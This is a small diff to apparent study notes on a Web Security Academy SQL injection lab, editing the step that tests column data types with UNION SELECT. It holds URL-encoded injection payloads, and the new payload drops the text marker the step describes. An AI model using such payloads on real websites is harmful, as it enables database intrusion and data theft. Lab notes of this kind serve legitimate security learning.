@@ -168,7 +168,7 @@ https://0aed007503ed3a1fa9f7494e002b00e3.web-security-academy.net/filter?categor
 
 **Step #2: Determine the data type of the columns**
 
-select a, b, c from table1 UNION select NULL, NULL, 'a'    ('+UNION+SELECT+'abcdef',NULL,NULL--)
+select a, b, c from table1 UNION select NULL, NULL, 'a'    ( '+UNION+SELECT+NULL,NULL--)
 -> error -> column is not type text
 -> no error -> column is of type text
 
